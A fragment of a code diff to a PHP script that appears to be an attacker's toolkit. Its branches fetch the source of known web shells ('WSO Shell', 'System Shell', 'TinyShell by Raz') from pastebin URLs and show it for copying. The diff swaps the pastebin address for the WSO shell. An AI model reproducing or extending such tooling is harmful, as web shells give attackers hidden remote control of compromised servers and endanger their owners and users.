@@ -159,7 +159,7 @@ if (isset($_POST['exec'])) {
     die("<h1>System Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/wwRaBWEG')) . "</textarea></form>");
 }
 if (isset($_POST['wso'])) {
-    die("<h1>WSO Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/mXy6VPxa')) . "</textarea></form>");
+    die("<h1>WSO Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/v5QMfGnM')) . "</textarea></form>");
 }
 if (isset($_POST['raz'])) {
     die("<h1>TinyShell by Raz</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/T76RBNLY')) . "</textarea></form>");
